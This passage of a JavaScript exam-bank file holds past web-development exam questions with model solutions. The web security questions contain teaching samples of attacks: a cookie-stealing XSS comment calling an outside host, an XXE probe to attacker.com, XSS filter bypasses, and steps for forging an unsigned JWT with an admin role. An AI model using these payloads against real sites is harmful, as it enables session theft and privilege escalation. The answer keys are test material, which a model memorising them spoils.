          q: `<p>A web application has three components: <b>ExamManager</b> (<code>exam-manager</code>), <b>ExamInfo</b> (<code>exam-info</code>) and <b>ExamList</b> (<code>exam-list</code>). ExamManager is made up of ExamInfo and ExamList. ExamList displays course exams with dates; ExamInfo lets the user add a new exam or change the date of an existing exam.</p>
<div class="figure mock"><b>Exam manager</b><div style="display:flex;gap:20px"><table style="width:auto"><tr><th>Course</th><th>Exam date</th></tr><tr><td>DAT152</td><td>2023-12-11</td><td><button type="button" disabled>Update</button></td></tr></table><fieldset><legend>Exam info</legend>Course: <input size="6" disabled value="PCS961"> Date: <input size="8" disabled value="2023-12-12"> <button type="button" disabled>Add exam to list</button></fieldset></div></div>
<p><code>examdata</code> is an object <code>{ code: "PCS961", date: "2023-12-12" }</code> (date formatted YYYY-MM-DD).</p>
<p><b>ExamInfo</b> public methods: <code>setInfo(examdata)</code> – sets the exam info to display; <code>examinfoCallback(callback)</code> – callback run on click on "Add exam to list", with examdata from the inputs.</p>
<p><b>ExamList</b> public methods: <code>addExam(examdata)</code> – adds the exam to the end of the list, or updates the date if the course already exists; <code>examupdateCallback(callback)</code> – callback run on click on an Update button, with the examdata of that exam.</p>
<p><b>Task:</b> Fill in the missing code of ExamManager.</p>`,
          starter: `const template = document.createElement("template");
template.innerHTML = \`
    <h1>Exam manager</h1>
    <div>
        <exam-info></exam-info>
        <exam-list></exam-list>
    </div>\`;

class ExamManager extends HTMLElement {
    #shadow;
    // Add the necessary private fields

    constructor() {
        super();
        this.#shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        // More code
        this.#shadow.append(content);
        // More code
    }

    // Add any additional private methods
}
customElements.define('exam-manager', ExamManager);
`,
          sol: `~~~javascript
class ExamManager extends HTMLElement {
    #shadow;
    #examinfo;
    #examlist;

    constructor() {
        super();
        this.#shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        this.#examinfo = content.querySelector("exam-info");
        this.#examlist = content.querySelector("exam-list");
        this.#shadow.append(content);

        // new or changed exam in ExamInfo -> add/update in ExamList
        this.#examinfo.examinfoCallback((examdata) => { this.#addexam(examdata) });
        // Update clicked in ExamList -> show the exam in ExamInfo
        this.#examlist.examupdateCallback((examdata) => { this.#editexam(examdata) });
    }

    #addexam(examdata) {
        this.#examlist.addExam(examdata);
    }

    #editexam(examdata) {
        this.#examinfo.setInfo(examdata);
    }
}
customElements.define('exam-manager', ExamManager);
~~~` },
        { label: "c", type: "code", lang: "javascript",
          q: `<p>Write the JavaScript code of <b>ExamList</b> (not ExamInfo). See b) for the public methods addExam and examupdateCallback. You can assume course codes are digits and capital letters only.</p>`,
          starter: `const template = document.createElement("template");
template.innerHTML = '<div id="examlist"></div>';

const examtable = document.createElement("template");
examtable.innerHTML = \`
    <table>
        <thead><tr><th>Course</th><th>Exam date</th></tr></thead>
        <tbody></tbody>
    </table>\`;

const examrow = document.createElement("template");
examrow.innerHTML = \`
    <tr>
        <td></td>
        <td></td>
        <td><button type="button">Update</button></td>
    </tr>\`;

class ExamList extends HTMLElement {

}
customElements.define('exam-list', ExamList);
`,
          sol: `~~~javascript
class ExamList extends HTMLElement {
    #shadow;
    #tbody;
    #callbacks = new Map();

    constructor() {
        super();
        this.#shadow = this.attachShadow({ mode: 'closed' });
        this.#shadow.append(template.content.cloneNode(true));
        const table = examtable.content.cloneNode(true);
        this.#shadow.getElementById("examlist").append(table);
        this.#tbody = this.#shadow.querySelector("tbody");
    }

    addExam(examdata) {
        let row = this.#tbody.querySelector(\`tr[data-code="\${examdata.code}"]\`);
        if (row === null) {
            row = examrow.content.cloneNode(true).firstElementChild;
            row.dataset.code = examdata.code;
            row.cells[0].textContent = examdata.code;
            row.querySelector("button").addEventListener("click",
                () => { this.#onupdate(examdata.code) });
            this.#tbody.append(row);
        }
        row.dataset.date = examdata.date;
        row.cells[1].textContent = examdata.date;
    }

    examupdateCallback(callback) {
        const id = Symbol("examupdate");
        this.#callbacks.set(id, callback);
        return id;
    }

    #onupdate(code) {
        const row = this.#tbody.querySelector(\`tr[data-code="\${code}"]\`);
        const examdata = { code: code, date: row.dataset.date };
        this.#callbacks.forEach(callback => callback(examdata));
    }
}
customElements.define('exam-list', ExamList);
~~~` }
      ]}
  ]
});

DAT.exams.push({
  id: "h22", title: "Høst 2022", kind: "past", appendix: ["spring", "js"], note: "Oppgave 2 (custom tags) er fjernet. Globalization brukte JSP; her lager du bare property-filene.",
  questions: [
    { title: "Question 1 – Globalization", weight: 15, tasks: [
        { label: "a", type: "text", q: `<p>Explain, in your own words, the terms globalization (g11n), internationalization (i18n) and localization (l10n). Also explain the relationship between the concepts.</p>`, sol: "@g11n" },
        { label: "b", type: "code", lang: "properties", q: `<p>Internationalize the page and localize it to English and one other language. Write the property files.</p>
~~~html
<body>
    November 15, 2022, the human population passed 8,000,000,000 humans.<br>
    The population is expected to grow by 30% until it peaks in the 2080s.<br>
</body>
~~~`, starter: PROPS_STARTER,
          sol: `~~~properties
# Message_en.properties
population={0}, the human population passed {1} humans.
grow=The population is expected to grow by {0} until it peaks in the {1}s.

# Message_no.properties
population={0}, passerte jordens befolkning {1} mennesker.
grow=Befolkningen er forventet å øke med {0} inntil den når toppen i {1}-tallet.
~~~
<p class="small">Dato, tall og prosent er parametere.</p>` }
      ]},
    { title: "Question 3 – Web APIs and Framework", weight: 20,
      intro: `<div class="figure"><b>Web store model</b><br>Customer: <code>id</code>, name, … &nbsp;|&nbsp; Order: <code>id</code>, customer, status, date, … &nbsp;|&nbsp; Item: <code>id</code>, name, price, … (an order contains items)</div>
<p>The web applications expect two types of users: <b>Customers</b> (register a customer account, order items) and <b>Company employees</b> (handle customers, items and orders).</p>`,
      tasks: [
        { label: "a", type: "code", lang: "text", q: `<p>Create the URI path design for the REST web services for both types of users. Include HTTP method, URI (from root) and a short description. You do NOT need filters (only path variables like {id}). The design should follow level 2 of the Richardson Maturity Model.</p>`,
          starter: "Method | URI | Description\nGET | /items | List all items in the store\nGET | /items/{id} | Get an item in the store (given by the item id)\n",
          sol: `<table><tr><th>Method</th><th>URI</th><th>Description</th></tr>
<tr><td>GET</td><td>/items</td><td>List all items</td></tr><tr><td>GET</td><td>/items/{id}</td><td>Get an item</td></tr><tr><td>POST</td><td>/items</td><td>Create an item</td></tr><tr><td>PUT</td><td>/items/{id}</td><td>Update an item</td></tr><tr><td>DELETE</td><td>/items/{id}</td><td>Delete an item</td></tr>
<tr><td>GET</td><td>/customers</td><td>Get all customers</td></tr><tr><td>GET</td><td>/customers/{id}</td><td>Get a customer</td></tr><tr><td>POST</td><td>/customers</td><td>Create a customer</td></tr><tr><td>PUT</td><td>/customers/{id}</td><td>Update a customer</td></tr><tr><td>DELETE</td><td>/customers/{id}</td><td>Delete a customer</td></tr>
<tr><td>GET</td><td>/customers/{id}/orders</td><td>Get all orders for a customer</td></tr><tr><td>GET</td><td>/customers/{id}/orders/{oid}</td><td>Get an order for a customer</td></tr><tr><td>POST</td><td>/customers/{id}/orders</td><td>Create an order for a customer</td></tr><tr><td>PUT</td><td>/customers/{id}/orders/{oid}</td><td>Update an order</td></tr><tr><td>DELETE</td><td>/customers/{id}/orders/{oid}</td><td>Delete an order</td></tr>
<tr><td>GET</td><td>/orders</td><td>Get all orders</td></tr><tr><td>GET</td><td>/orders/{id}</td><td>Get an order incl. items</td></tr><tr><td>POST</td><td>/orders/{id}/items</td><td>Add an item to an order</td></tr><tr><td>PUT</td><td>/orders/{id}/items/{iid}</td><td>Update an item in an order</td></tr><tr><td>DELETE</td><td>/orders/{id}/items/{iid}</td><td>Delete an item from an order</td></tr></table>` },
        { label: "b", type: "code", lang: "java", q: `<p>A skeleton for a REST controller for "Customers" (Spring Boot + Spring Web MVC):</p>
~~~java
public interface CustomerRepository {
    List<Customer> findAll();
    Optional<Customer> findById(Long id);
    Customer save(Customer customer);
    void delete(Customer customer);
    List<Order> findCustomerOrdersByStatus(Long customerId, String status);
}
~~~
<p>Write the controller methods below. They should return a ResponseEntity with proper HTTP statuses:</p>
<ol><li>Create a new customer. Statuses: OK (200) or Bad Request (400).</li><li>Get a customer given by the customer id. Statuses: OK (200) or Not Found (404).</li><li>Get all orders with a given status for a given customer. Statuses: OK (200) or Not Found (404).</li></ol>`,
          starter: `@RestController
@RequestMapping(CustomerController.BASE_URL)
public class CustomerController {

    final static String BASE_URL = "/customers";

    @Autowired
    private CustomerRepositoryImpl repository;

    // write the controller methods below

}
`,
          sol: `~~~java
// 1. Create a new customer
@PostMapping
public ResponseEntity<Customer> newCustomer(@RequestBody Customer customer) {
    try {
        Customer newCustomer = repository.save(customer);
        return ResponseEntity.ok().body(newCustomer);
    } catch (Exception e) {
        return ResponseEntity.badRequest().build();
    }
}

// 2. Get a customer given by the customer id
@GetMapping("/{id}")
public ResponseEntity<Customer> getCustomer(@PathVariable("id") Long id) {
    Optional<Customer> customer = repository.findById(id);
    return customer
        .map(c -> ResponseEntity.ok().body(c))
        .orElseGet(() -> ResponseEntity.notFound().build());
}

// 3. Get all orders with a given status for a given customer
@GetMapping("/{id}/orders")
public ResponseEntity<List<Order>> getCustomerOrdersByStatus(
        @PathVariable("id") Long id, @RequestParam("status") String status) {
    List<Order> orders = repository.findCustomerOrdersByStatus(id, status);
    if (orders == null || orders.isEmpty()) {
        return ResponseEntity.notFound().build();
    }
    return ResponseEntity.ok().body(orders);
}
~~~` }
      ]},
    { title: "Question 4 – Universal Design", weight: 10, tasks: [
        { label: "a", type: "text", q: `<p>Who is WCAG 2.1 (Web Content Accessibility Guidelines) meant for and why?</p>`, sol: "@wcagWho" },
        { label: "b", type: "text", q: `<p>What does WCAG 2.1 cover?</p>`, sol: `<p>It is organized in four principles: Perceivable, Operable, Understandable and Robust – with guidelines for each, and testable success criteria at three levels (A, AA, AAA).</p>` },
        { label: "c", type: "text", q: `<p>One of the principles in WCAG 2.1 is "Operable". Discuss briefly how to meet this principle. Also give and explain an example of failure to adhere to this principle.</p>`, sol: "@operable" }
      ]},
    { title: "Question 5 – Web security", weight: 25, tasks: [
        { label: "a", type: "text", q: `<p>Multiple choice (some questions may have several correct answers). Give the answer and a short justification.</p>
<ol>
<li>Can it be a serious security risk to rely only on client-side validation of critical functions? (1) No, we can make the validation strong enough (2) Yes, because it is possible to inject untrusted data from the client side (3) No, because the client can validate the response from the server (4) Yes, because anything coming from the client should not be trusted</li>
<li>A user requested to reset his password and received the password in plaintext by email. How was it possibly stored? (1) plaintext (2) two-way encryption (3) one-way hash</li>
<li>In a single sign on (SSO) solution: (1) An identity provider is responsible for issuing and managing authentication tokens (2) A service provider is responsible for issuing and managing authentication tokens (3) Service providers must use the certificate from the identity provider to verify authentication tokens (4) A service provider must issue a token to the identity provider</li>
<li>A web service uses access and refresh tokens. The access token has expired. Is it possible to use any refresh token to request a new access token? (1) Yes, if there is an association between the tokens (2) No, if there is an association between the tokens (3) No, if there is no association (4) Yes, if there is no association</li>
<li>Which part of a JWT is usually signed? (1) header and signature (2) payload (3) header, payload and signature (4) header and payload</li>
</ol>`,
          sol: `<ol><li><b>2 and 4</b> – anything from the client can be manipulated and must be validated on the server.</li><li><b>1 and 2</b> – a hash cannot be reversed.</li><li><b>1 and 3</b>.</li><li><b>2 and 4</b> – the refresh token must be tied to the client/access token.</li><li><b>4</b> – header and payload.</li></ol>` },
        { label: "b", type: "code", lang: "java", q: `<p>The SQL query below is vulnerable to SQL injection. <code>asckey</code> corresponds to either the 'shoppingitem' or 'datetime' column in the ShoppingCart table. Write a mitigation for this code.</p>
~~~java
public List<Cart> doSearch(String userid, String asckey) throws SQLException {
    List<Cart> items = new ArrayList<Cart>();
    try {
        String sqlQuery = "select * from ShoppingCart where userid='" + userid
                        + "' ORDER BY " + asckey + " ASC";
        Connection conn = Db.getConnection();
        Statement stmt = conn.createStatement();
        ResultSet rs = stmt.executeQuery(sqlQuery);
        if (!rs.next()) {
            throw new SecurityException("UserId incorrect");
        } else {
            // proceed and store result in items
        }
    } finally {
        try { conn.close(); } catch (SQLException x) { }
    }
    return items;
}
~~~`,
          sol: `<p>1) Validate <code>asckey</code> against an allow-list (only "shoppingitem" or "datetime"). 2) Use a PreparedStatement where userid is a parameter.</p>
~~~java
String sql;
if (asckey.equals("shoppingitem") || asckey.equals("datetime")) {
    sql = "SELECT * FROM ShoppingCart WHERE userid = ? ORDER BY " + asckey + " ASC";
} else {
    throw new SecurityException("Invalid sort key");   // log invalid input
}
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setString(1, userid);
ResultSet rs = pstmt.executeQuery();
~~~` },
        { label: "c", type: "text", q: `<p>Inspect the two code snippets. 1) Are they vulnerable to XSS? 2) If no, justify. 3) If yes, justify and give the type(s) of XSS.</p>
~~~java
private void snippet1(HttpServletRequest request, HttpServletResponse response) throws Throwable {
    String data = "";
    Cookie cookies[] = request.getCookies();
    if (cookies != null)
        data = cookies[0].getValue();
    if (data != null) {
        response.getWriter().println("<br> data = " + data);
    }
}

private void snippet2(HttpServletRequest request, HttpServletResponse response) throws Throwable {
    String data = request.getParameter("name");
    if (data != null) {
        response.getWriter().println("<br> data = " + data.replaceAll("(<script>)", ""));
    }
}
~~~`,
          sol: `<p><b>Yes, both are vulnerable.</b></p>
<p><b>Snippet 1:</b> untrusted data from a cookie is written to the page without validation and without output encoding. Type: <b>stored XSS</b> (the payload is stored in the browser's cookie).</p>
<p><b>Snippet 2:</b> untrusted data from <code>getParameter</code> is written to the page without proper output encoding. Removing <code>&lt;script&gt;</code> is a weak blacklist that can be bypassed, e.g. <code>&lt;scr&lt;script&gt;ipt&gt;</code> or <code>&lt;img src=x onerror=…&gt;</code>. Type: <b>reflected XSS</b>.</p>` },
        { label: "d", type: "text", q: `<p>Describe the different approaches to store passwords.</p><p>1. Which approach is the best to protect against various attacks and why?<br>2. What are the challenges with the other approaches?<br>3. Describe briefly the attack techniques against passwords.</p>`, sol: ["@pwStore", "@pwAttacks"] },
        { label: "e", type: "text", q: `<p>In Oblig3, the service provider (DAT152BlogApp) receives an id_token (JWT) from the identity provider (DAT152WebSearch), used to grant access and determine the role of the user:</p>
~~~json
HEADER:  { "alg": "RS256" }
PAYLOAD: { "iss": "http://localhost:9092/DAT152WebSearch", "sub": "47544B959729E79BDCA8766A87A8971C",
           "aud": "http://localhost:9091/blogapp/callback", "iat": 1632243868, "exp": 1633243868,
           "role": "user" }
~~~
<p>1. Explain clearly how to manipulate the id_token so it can be exploited to elevate the privilege of the user.<br>2. If the attack would succeed, what vulnerability is present in the service provider endpoint?</p>`,
          sol: `<p><b>1.</b> Decode the token and change the header to <code>"alg": "none"</code> and the role to <code>"admin"</code>. Base64-encode header and payload again and remove the signature, but keep the last dot: <code>header.payload.</code></p>
<p><b>2.</b> The SP does not verify the signature, or uses a JWT parser that accepts unsigned tokens (e.g. <code>Jwts.parse(jwt)</code> instead of <code>parseClaimsJws(jwt)</code>).</p>` },
        { label: "f", type: "text", q: `<p>Describe briefly how the 'trust' relationship between an identity provider and a service provider is established.</p>`, sol: "@trust" }
      ]},
    { title: "Question 6 – JavaScript", weight: 20, tasks: [
        { label: "a i", type: "text", q: `<p>A file util.js has the code below (you are not asked to implement it):</p>
~~~javascript
export default {
    metrestofeet(metres) { /* returns length in feet */ },
    feettometres(feet) { /* returns length in metres */ },
    unitInLanguage(unit, language) { /* returns the name of unit in language */ }
}
~~~
<p>What are the consequences of the <code>export default</code> statement?</p>`,
          sol: `<p>Imports and exports let JavaScript handle its dependencies. A module can have zero or one export default; this is what is imported when we do not name what to import, and the importer chooses the name.</p>` },
        { label: "a ii", type: "code", lang: "javascript", q: `<p>Demonstrate how to import util.js from another JavaScript module, and how to call the method metrestofeet from that module. You can choose the folder structure.</p>`, sol: "@exportDefault" },
        { label: "b i", type: "text", q: `<p>What is shadow DOM, what are the consequences of using shadow DOM, and what differentiates the open and closed modes?</p>`, sol: "@shadowDom" },
        { label: "b ii", type: "code", lang: "javascript",
          q: `<p>The custom tag <code>LENGTH-READER</code> lets the user input a length value. It is based on an HTML TEMPLATE chosen from the browser language:</p>
~~~html
<template data-name="length-reader" data-language="en-GB">
    <fieldset>
        <legend>Length in <span data-units></span></legend>
        <input type="number" value="" min="0" placeholder="Enter length"/>
    </fieldset>
</template>
<template data-name="length-reader" data-language="nb-NO">
    <fieldset>
        <legend>Lengde i <span data-units></span></legend>
        <input type="number" value="" min="0" placeholder="Angi lengde"/>
    </fieldset>
</template>
~~~
<p>If no template matches the browser language, use the first template with data-name "length-reader". If the browser reports no language, default to "en-GB". Use: <code>&lt;length-reader data-units="foot"&gt;&lt;/length-reader&gt;</code> (the unit name is shown in the legend, converted with <code>util.unitInLanguage(unit, language)</code>).</p>
<p>Public methods: <code>setValue(length)</code> – sets the value of the INPUT; <code>addCallback(callback)</code> – callback run on event <code>input</code> on the INPUT, with the current value as parameter.</p>
<p>Use shadow DOM in closed mode to implement the element for LENGTH-READER.</p>`,
          starter: `import util from '../../js/modules/util.js';

class LengthReader extends HTMLElement {

}
`,
          sol: `~~~javascript
import util from '../../js/modules/util.js';

export default class LengthReader extends HTMLElement {
    #shadow;
    #callbacks = new Map();
    #callbackId = 0;

    constructor() {
        super();
        let language = navigator.language;
        if (language === undefined) language = "en-GB";

        this.#shadow = this.attachShadow({ mode: 'closed' });
        let template = document.querySelector(
            \`[data-name="length-reader"][data-language="\${language}"]\`);
        if (template === null) {
            template = document.querySelector('[data-name="length-reader"]');
        }
        if (template === null) return;
        this.#shadow.appendChild(template.content.cloneNode(true));

        if (this.hasAttribute('data-units')) {
            const unit = util.unitInLanguage(this.getAttribute('data-units').trim(), language);
            this.#shadow.querySelector("span[data-units]").textContent = unit;
        }
        this.#shadow.querySelector("input")
            .addEventListener("input", () => this.#oninput());
    }

    addCallback(callback) {
        const id = this.#callbackId++;
        this.#callbacks.set(id, callback);
        return id;
    }

    setValue(length) {
        this.#shadow.querySelector("input").value = length;
    }

    #oninput() {
        const value = this.#shadow.querySelector("input").value;
        this.#callbacks.forEach(callback => callback(value));
    }
}
~~~` },
        { label: "c i", type: "code", lang: "javascript",
          q: `<p>The custom tag <code>LENGTH-CONVERTER</code> converts between metres and feet, based on this template:</p>
~~~html
<template data-name="converter">
    <length-reader data-units="meter"></length-reader>
    <length-reader data-units="foot"></length-reader>
</template>
~~~
<p>On user input in one LENGTH-READER, the corresponding value must immediately be calculated and shown in the other (use <code>util.metrestofeet</code> and <code>util.feettometres</code>). Use shadow DOM in closed mode to implement LENGTH-CONVERTER.</p>`,
          starter: `import util from '../../js/modules/util.js';

class LengthConverter extends HTMLElement {

}
`,
          sol: `~~~javascript
import '../lengthreader/main.js';
import util from '../../js/modules/util.js';

class LengthConverter extends HTMLElement {
    #shadow;
    #metricElement;
    #imperialElement;

    constructor() {
        super();
        this.#shadow = this.attachShadow({ mode: 'closed' });
        const template = document.querySelector('[data-name="converter"]');
        if (template === null) return;
        this.#shadow.appendChild(template.content.cloneNode(true));

        this.#metricElement = this.#shadow.querySelector('length-reader[data-units="meter"]');
        this.#imperialElement = this.#shadow.querySelector('length-reader[data-units="foot"]');
        this.#metricElement.addCallback((value) => this.#metricinput(value));
        this.#imperialElement.addCallback((value) => this.#imperialinput(value));
    }

    #metricinput(input) {
        const value = input.trim();
        if (value === "") {
            this.#imperialElement.setValue("");
        } else {
            const feet = util.metrestofeet(parseFloat(value));
            this.#imperialElement.setValue(feet.toPrecision(4));
        }
    }

    #imperialinput(input) {
        const value = input.trim();
        if (value === "") {
            this.#metricElement.setValue("");
        } else {
            const metres = util.feettometres(parseFloat(value));
            this.#metricElement.setValue(metres.toPrecision(4));
        }
    }
}
customElements.define('length-converter', LengthConverter);
~~~` },
        { label: "c ii", type: "text", q: `<p>The HTML file is index.html, and all JavaScript is included as modules using import and export.</p>
<ul><li>What JavaScript files would you use, and in what files would you put the import and export statements? Remember to import util.js.</li>
<li>Show the HTML SCRIPT tag(s) with all necessary attributes. Where in index.html would you put them? Explain.</li>
<li>Demonstrate how to use customElements.define to create LENGTH-READER and LENGTH-CONVERTER. In what files would you put the call? Explain.</li></ul>`,
          sol: `<p><b>Files:</b> <code>index.html</code>, <code>js/appcontroller.js</code>, <code>js/modules/util.js</code>, <code>components/lengthreader/main.js</code>, <code>components/lengthconverter/main.js</code>.</p>
<ul><li>appcontroller.js: <code>import '../components/lengthconverter/main.js';</code></li>
<li>lengthconverter/main.js: <code>import '../lengthreader/main.js';</code> and <code>import util from '../../js/modules/util.js';</code></li>
<li>lengthreader/main.js: <code>import util from '../../js/modules/util.js';</code></li>
<li>util.js: <code>export default { … }</code></li></ul>
<p><b>Script tag:</b> <code>&lt;script src="js/appcontroller.js" type="module"&gt;&lt;/script&gt;</code> in the <b>head</b>. type="module" is required to use import, and implies defer, so the script is downloaded in parallel with parsing the HTML and runs when the DOM is built – it starts loading sooner.</p>
<p><b>define:</b> put it in the component files, e.g. <code>customElements.define('length-reader', LengthReader);</code> in lengthreader/main.js and <code>customElements.define('length-converter', LengthConverter);</code> in lengthconverter/main.js. Then the components are imported only for their side effects and no export of the class is needed. (Alternative: export the class and call define in appcontroller.js.)</p>` }
      ]}
  ]
});

DAT.exams.push({
  id: "h21", title: "Høst 2021", kind: "past", appendix: ["spring", "js"], note: "Oppgave 2 (custom tags) er fjernet. Globalization brukte JSP; her lager du bare property-filene. Spørsmålene om Front Controller og action/component-based er eldre pensum.",
  questions: [
    { title: "Question 1 – Globalization", weight: 15, tasks: [
        { label: "a", type: "text", q: `<p>Explain, in your own words, the terms globalization (g11n), internationalization (i18n) and localization (l10n). Also explain the relationship between the concepts.</p>`, sol: "@g11n" },
        { label: "b", type: "code", lang: "properties", q: `<p>Internationalize the page and localize it to English and one other language. Write the property files.</p>
~~~html
<body>
    Today, 6. December 2021 is the day of the exam.<br>
    This year, the exam has 6 questions.<br>
    You need 40% correct to pass and approximately 90% correct or more to get an A.<br>
    <p><a href="index.jsp">Home</a></p>
</body>
~~~`, starter: PROPS_STARTER,
          sol: `~~~properties
# Messages_en.properties
today=Today, {0} is the day of the exam.
questions=This year, the exam has {0} questions.
grade=You need {0} correct to pass and approximately {1} correct or more to get an A.
home=Home

# Messages_no.properties
today=I dag, {0} er eksamensdagen.
questions=I år har eksamen {0} oppgaver.
grade=Du må ha {0} riktig for å stå og omtrent {1} riktig eller mer for å få en A.
home=Hjem
~~~
<p class="small">Sensor: trekk hvis parametere ikke brukes.</p>` }
      ]},
    { title: "Question 3 – Web APIs and Framework", weight: 20, tasks: [
        { label: "a", type: "text", q: `<p>Explain the two design patterns Front Controller and Command. How can they be used to create a web framework?</p>`, sol: "@frontController" },
        { label: "b", type: "text", q: `<p>Explain the differences between action-based and component-based web frameworks. Define the two terms and give an example of each.</p>`, sol: "@actionVsComponent" },
        { label: "c", type: "code", lang: "text", q: `<p>How can we create a RESTful API for the following web services?</p><ul><li>Create a new shopping list</li><li>Delete an existing shopping list</li><li>Add a new item in a shopping list</li><li>Update an item in a shopping list</li><li>Delete an item from a shopping list</li><li>Read all items from a shopping list</li></ul>`,
          sol: `<table><tr><th>Service</th><th>URI</th><th>HTTP</th></tr>
<tr><td>Create a new shopping list</td><td>/shoppinglists</td><td>POST</td></tr>
<tr><td>Delete a shopping list</td><td>/shoppinglists/{lid}</td><td>DELETE</td></tr>
<tr><td>Add a new item</td><td>/shoppinglists/{lid}/items</td><td>POST</td></tr>
<tr><td>Update an item</td><td>/shoppinglists/{lid}/items/{iid}</td><td>PUT</td></tr>
<tr><td>Delete an item</td><td>/shoppinglists/{lid}/items/{iid}</td><td>DELETE</td></tr>
<tr><td>Read all items</td><td>/shoppinglists/{lid}/items</td><td>GET</td></tr></table>
<p>Readable URLs with nouns, and the HTTP method decides the operation. On the server, annotations map URL + method to controller methods (e.g. <code>@PostMapping("/shoppinglists/{lid}/items")</code>), and the client sends JSON with fetch.</p>` }
      ]},
    { title: "Question 4 – Universal Design", weight: 10, tasks: [
        { label: "a", type: "text", q: `<p>Who is WCAG 2.1 meant for and why?</p>`, sol: "@wcagWho" },
        { label: "b", type: "text", q: `<p>What does WCAG 2.1 cover?</p>`, sol: `<p>It is organized in four principles: Perceivable, Operable, Understandable and Robust – with guidelines for each, and testable success criteria at three levels (A, AA, AAA).</p>` },
        { label: "c", type: "text", q: `<p>One of the principles in WCAG 2.1 is "Understandable". Discuss briefly how to meet this principle. Also give and explain an example of failure to adhere to this principle.</p>`, sol: "@understandable" },
        { label: "d", type: "text", q: `<p>Is there a connection between internationalization and the "Understandable" principle? Explain your answer.</p>`,
          sol: `<p>Yes. Guideline "Readable" requires that the language of the page (and of parts in another language) can be determined, e.g. <code>&lt;html lang="no"&gt;</code>. An internationalized application must set the correct language for each locale, so screen readers pronounce the text correctly and the text is understandable for the user.</p>` }
      ]},
    { title: "Question 5 – Web security", weight: 25, tasks: [
        { label: "a", type: "text", q: `<p>Multiple choice (choose all correct options). Give the answers.</p>
<ol>
<li>On https://gossip.blog.com a comment contains <code>&lt;script&gt;document.write(\`&lt;img src='' onerror='http://justpassingby.com/?'document.cookie/&gt;\`);&lt;/script&gt;</code>. Possible attack scenarios? (1) stealing the session cookie using XSS (2) stealing the session cookie using CSRF (3) a stored XSS has been performed (4) stealing the cookie using both XSS and CSRF</li>
<li>One way to identify potential security risks during the design phase is to: (1) perform threat modelling (2) use misuse case (3) use static code analysis (4) use penetration testing</li>
<li>A password system uses 11 characters from lowercase, uppercase and numbers. An attacker has hardware with 40 cores, each processing 10 billion passwords per second. How long to crack any password? (1) 4 years (2) 467 days (3) 243 days (4) 97 hours</li>
<li>During code review you find "Runtime.exec()". Likely vulnerability? (1) Insecure serialisation (2) SQL injection (3) Command injection</li>
<li>Which data can be treated as untrusted? (1) ServletRequest.getParameter(String name) (2) data received from another internal system (3) data received from an external system (4) cookie data (5) data hardcoded in the system</li>
<li>"SELECT id, name, short_name FROM company WHERE id = " + request.getParameter("company_id") can lead to: (1) XSS (2) Command Injection (3) SQL injection (4) Path injection</li>
<li>Attack vector: <code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM "http://attacker.com"&gt; %remote;]&gt;</code>. What is the attacker trying? (1) determine if the app is vulnerable to XXE injection (2) SQL injection (3) xpath injection (4) determine if XInclude is enabled</li>
<li>Secure way(s) to handle session ids: (1) HttpOnly and transmitted over http (2) used only for a single authenticated session (3) HttpOnly and transmitted over https</li>
<li>Payload results in "SELECT first_name, last_name FROM user_system_data UNION SELECT login_count FROM user_data;". Will it succeed? (1) Yes (2) No (3) Don't know</li>
<li>A banking app asks the customer to approve a transfer with his password. What type of CSRF mitigation? (1) Samesite (2) Double submit cookie (3) Referer header (4) Synchroniser token (5) Challenge-Response</li>
</ol>`,
          sol: `<ol><li><b>1, 3</b></li><li><b>1, 2</b></li><li><b>1 (4 years)</b> – 62¹¹ ≈ 5.2·10¹⁹ / (40·10¹⁰) ≈ 1.3·10⁸ s</li><li><b>3</b></li><li><b>1, 2, 3, 4</b></li><li><b>3</b></li><li><b>1</b></li><li><b>2, 3</b></li><li><b>2</b> – different number of columns</li><li><b>5</b></li></ol>` },
        { label: "b", type: "text", q: `<p>An online shop has the order form below. The currency is stored in a hidden field.</p>
~~~html
<form action="doclient" method="post">
    <p>Quantity:</p><input type="text" name="quantity" value="0" />
    <input type="hidden" name="currency" value="kroner" />
    <input type="submit" value="Submit"/>
</form>
~~~
~~~java
@WebServlet("/doclient")
public class DoClientOrder extends HttpServlet {
    protected void doPost(HttpServletRequest request, HttpServletResponse response) ... {
        String quantity = request.getParameter("quantity");
        String currency = request.getParameter("currency");
        Integer int_qty = 0;
        try {
            int_qty = Integer.parseUnsignedInt(quantity);
        } catch (NumberFormatException e) { /* error */ }
        if (currency.equals("kroner")) {
            computeCostInKroners(int_qty);
        } else {
            computeCostInDollars(int_qty);
        }
    }
}
~~~
<p>1. Are there vulnerabilities in the server-side implementation? 2. Explain your answer.</p>`,
          sol: `<p><b>No.</b> Input validation has been done on the untrusted data: quantity is validated with <code>parseUnsignedInt()</code>, and currency is validated by checking it explicitly against the string literal "kroner".</p>` },
        { label: "c", type: "text", q: `<p>Describe the different approaches to store passwords. Among the approaches, which is the best to protect against various attacks and why?</p>`, sol: "@pwStore" },
        { label: "d", type: "text", q: `<p>A JWT consists of Header.Claims.Signature. Describe how the signature part is derived using 1. a symmetric key 2. an asymmetric key.</p>`, sol: "@jwtSig" },
        { label: "e", type: "text", q: `<p>In Oblig3 the SP (DAT152BlogApp) receives an id_token from the IdP (DAT152WebSearch):</p>
~~~json
HEADER:  { "alg": "RS256" }
PAYLOAD: { "iss": "http://localhost:9092/DAT152WebSearch", "sub": "47544B959729E79BDCA8766A87A8971C",
           "aud": "http://localhost:9090/blogapp/callback", "iat": 1632243868, "role": "user" }
~~~
<p>1. Explain the security requirements the identity provider must take when it issues the id_token.<br>2. Explain the security considerations the service provider must take when it receives the id_token.</p>`,
          sol: `<p><b>1. IdP:</b> include iss, aud (client_id of the SP), sub, exp and iat – and the id_token <b>must be signed</b>. (exp is missing in the example.)</p>
<p><b>2. SP:</b> validate the signature; iss must match the IdP exactly; aud must contain its client_id; current time must be before exp; iat can be used to reject tokens issued too long ago (and verify nonce if used).</p>` },
        { label: "f", type: "text", q: `<p>In Oblig3 a client can request a new access_token by providing its client_id and the refresh_token:</p>
~~~text
curl -X POST http://localhost:9092/DAT152WebSearch/token --data
'grant_type=refresh_token&client_id=7759FCCB4EC2445EF13E1516F9CDB650&refresh_token=25EE6148E31F038EEB39A6ED216D50B9'
~~~
<p>1. What is the likely vulnerability an attacker can exploit? 2. How can it be fixed?</p>`, sol: "@refreshToken" }
      ]},
    { title: "Question 6 – JavaScript", weight: 20, tasks: [
